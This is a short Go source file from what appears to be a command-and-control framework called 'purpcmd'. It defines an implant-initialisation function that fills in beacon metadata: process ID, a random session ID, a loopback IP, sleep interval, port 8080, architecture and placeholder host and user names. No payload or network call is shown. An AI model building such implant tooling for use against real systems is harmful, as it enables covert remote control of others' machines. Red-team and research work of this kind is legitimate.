package core

import (
	"math/rand"
	"os"
	"purpcmd/implant"
	"purpcmd/internal"
	"runtime"
)


func RandInt() uint32 {
	min := 10000
    max := 99999
    return uint32(rand.Intn(max - min) + min)
}

func getArch() uint8 {
	switch runtime.GOARCH {
	case "amd64":
		return internal.AMD64
	}
	return 0
}

func ImplantInit() *implant.ImplantMetadata {
	return &implant.ImplantMetadata {
		PID: uint32(os.Getpid()),	
		SessionID: RandInt(),
		IP: 2130706433,
		Sleep: 10,
		Port: 8080,
		Arch: getArch(),

		Proc: "procname",
		Hostname: "machine",
		User: "pedro",
	}
}